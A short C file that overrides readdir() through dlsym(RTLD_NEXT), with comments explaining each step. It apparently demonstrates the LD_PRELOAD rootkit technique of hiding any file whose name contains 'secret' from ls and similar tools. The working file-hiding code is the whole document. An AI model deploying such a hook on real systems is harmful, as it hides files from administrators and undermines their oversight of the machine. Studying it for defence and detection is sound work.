#define _GNU_SOURCE

#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

struct dirent *readdir(DIR *dirp)
{
    static struct dirent *(*real_readdir)(DIR *dirp) = NULL;    // Define our own version of readdir

    if (!real_readdir)                                          // If readdir haven't been looked up 
    {
        real_readdir = dlsym(RTLD_NEXT, "readdir");             // Look up the real readdir with dlsym(). This ensures we can still call the original readdir()
    }

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL)                // Calls the read readdir() in a loop to get directory entries (returns NULL when no more entries)
    {
        if(strstr(entry->d_name, "secret") != NULL)             // If a file called has substring "secret" this skips it to hide it from ls
        {
            continue;
        }
        return entry;                                           // Return entries found by readdir() like normal
    }

    return NULL;
}
